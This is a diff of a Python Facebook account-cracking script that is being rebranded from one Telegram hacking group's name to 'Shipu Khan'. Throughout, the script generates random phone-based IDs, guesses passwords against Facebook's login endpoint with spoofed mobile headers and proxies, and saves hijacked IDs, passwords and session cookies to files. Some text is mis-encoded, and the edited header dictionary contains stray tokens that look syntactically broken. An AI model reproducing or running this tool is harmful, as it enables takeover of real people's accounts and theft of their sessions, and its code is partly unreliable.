@@ -1,10 +1,4 @@
-
-#DECODE BY : AFGHAN TECH
-#ATC
-#https://t.me/Afghan_Tech_001
-##ðŸ˜‚ðŸ˜‚ðŸ˜‚###
-#Ø¯ÛŒÚ©Ù‡ Ø³Ø± Ù…Ù‡ Ù¾ÙˆØ³Øª Ù†Ù…Ø§Ù†ÛŒ
-
+#Create By Shipu Khan
 #---------------------[IMPORT]---------------------#
 from os import path
 import os,base64,zlib,pip,urllib
@@ -39,9 +33,9 @@ try:
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
     os.system('python run.py')
-print('\n\033[1;32m[â€¢]   JOIN MY TELEGRAM CHANNEL');time.sleep(1)
-os.system('xdg-open https://t.me/Afghan_black_hack_team313')
-print('\n\033[1;36m[â€¢]   WELCOME TO BLOCK TOOL...');time.sleep(3)
+print('\n\033[1;32m[Shipu]   FOLLOW MY FACEBOOK ID');time.sleep(1)
+os.system('xdg-open https://www.facebook.com/shipukhan72')
+print('\n\033[1;36m[Shipu]   WELCOME TO SHIPU KHAN TOOL...');time.sleep(3)
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
 P = '\x1b[1;97m' # PUTIH
 M = '\x1b[1;91m' # MERAH
@@ -161,7 +155,7 @@ try:
     prox= requests.get('https://github.com/shipukhan2001/Sk_Shipu/blob/main/Sk_Shipu.txt').text
     open('socks5.txt','w').write(prox)
 except Exception as e:
-    print('[â€¢] Checking Server...') 
+    print('[SHIPU] Checking Server...') 
 
 logo=(f'''{B}\033[0;92m
 
@@ -178,7 +172,7 @@ logo=(f'''{B}\033[0;92m
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║\33[0;42mTOOLS      :   RANDOM\033[0;92m          \33[0;41mFIRE\033[0;92m          ║
-║\33[0;41mVERSION    :   1.0 \033[0;92m                          ║
+║\33[0;41mVERSION    :   4.8 \033[0;92m                          ║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 
 --------------------------------------------{B}''')
@@ -212,7 +206,7 @@ def riaz():
 	print('\33[1;31m[3] FOLLOW MY FACEBOOK')
 	print('\33[1;31m[0]\x1b[1;91m EXIT ')
 	print('\33[1;37m----------------------------------------------')
-	riaz1 = input('[â€¢] SELECT OPTION : ')
+	riaz1 = input('[SHIPU] SELECT OPTION : ')
 	if riaz1 =='1':
 		annu()
 	if riaz1 =='0':
@@ -232,7 +226,6 @@ def annu():
     print('\33[1;91m[1] METHOD_1_           \33[1;36m  {CRACK MIX IDS}  ')
     print('\33[1;91m[2] METHOD_2_           \33[1;36m  {CRACK NEW IDS} ')            
     print('\33[1;31m[3] METHOD_3_            \33[1;36m {CRACK OLD AND GAME ID} ')
-    print('\33[1;36m{ALL METHOD IS UPDATED} ')
     print('\33[1;31m[4] \x1b[1;91mBACK MENU ')
     lines()
     riaz1 = input('[+] CHOOSE OPTION : ')
@@ -266,7 +259,7 @@ def m1():
     user=[]
     os.system('clear')
     print(logo)
-    print('\33[1;31m CHOOSE CODE : 070, 079, 078, 077, 074')
+    print('\33[1;31m CHOOSE CODE : 9370, 9378, 9377, 9379, 9374')
     lines()
     kode = input(' PUT CODE : ')
     lines()
@@ -302,7 +295,7 @@ def m2():
     user=[]
     os.system('clear')
     print(logo)
-    print('\33[1;31m CHOOSE CODE : 070, 078, 077, 079, 074')
+    print('\33[1;31m CHOOSE CODE : 9370, 9378, 9377, 9379, 9374')
     lines()
     kode = input(' PUT CODE : ')
     lines()
@@ -374,7 +367,7 @@ def b1():
     user=[]
     os.system('clear')
     print(logo)
-    print('\33[1;31m EXAMPLE : 0306,92***,92***,')
+    print('\33[1;31m EXAMPLE : 070, 079, 078, 077, 074')
     lines()
     kode = input(' PUT CODE : ')
     lines()
@@ -410,7 +403,7 @@ def b2():
     user=[]
     os.system('clear')
     print(logo)
-    print(' \33[1;31mEXAMPLE  : 92***,92***,92***,')
+    print(' \33[1;31mEXAMPLE  : 070, 079, 078, 077, 074')
     lines()
     kode = input(' PUT CODE : ')
     lines()
@@ -465,45 +458,48 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {
+            header_freefb = {''
     'authority': 'p.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
-    'dpr': '2',
+    'dpr': '2.75',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Infinix PR652B"',
+    'sec-ch-ua-model': '"22111317PI"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',''}
             lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[SK-OK] '+cid+' | '+ps+'\033[0;97m\n[â€Žâ€ŽðŸª]\033[0;37m COOKIE = \033[1;36m'+coki+  '  ''  \033[0;97m')
-                open('SK-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                print('\033[1;32m[SHIPU-OK] '+cid+' | '+ps+'\033[0;97m\n[SHIPU]\033[0;37m COOKIE = \033[1;36m'+coki+  '  ''  \033[0;97m')
+                os.system("espeak \"Congratulation, OK, ID \"")
+                open('SHIPU-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                #print('[SK-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('BLOCK-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                #print('[SHIPU-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                os.system("espeak \"Cp, ID \"")
+                open('SHIPU-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mBLOCK-XD\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mSK-SHIPU\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
@@ -511,4 +507,4 @@ def rcrack(uid,pwx,tl):
 riaz()
 
 
-#fuck BlockðŸ˜‚
+#SK Vai
